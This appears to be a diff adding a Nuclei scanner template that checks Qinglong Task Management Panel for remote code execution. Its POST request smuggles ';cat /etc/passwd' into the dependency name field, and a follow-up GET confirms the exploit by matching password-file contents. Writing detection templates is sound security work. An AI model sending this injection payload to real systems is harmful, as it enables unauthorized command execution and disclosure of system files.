@@ -1,0 +1,60 @@
+id: qinglong-ttmp-dependencies-rce
+
+info:
+  name: Qinglong Task Management Panel Dependencies Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    Potential Remote Code Execution vulnerability in Qinglong Task Management Panel's dependencies endpoint.
+
+variables:
+  current_time: '{{date_time("%H:%M")}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: initial-post
+    method: POST
+    path:
+      - "{{BaseURL}}/Api/dependencies"
+    headers:
+      Content-Type: application/json
+    body: |-
+      [{"name":";cat /etc/passwd","type":0}]
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "createdAt"
+          - "updatedAt"
+          - "{{current_time}}"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+  - id: validate-get
+    method: GET
+    path:
+      - "{{BaseURL}}/Api/dependencies"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+          - "{{current_time}}"
+      - type: word
+        part: header
+        words:
+          - "application/json"
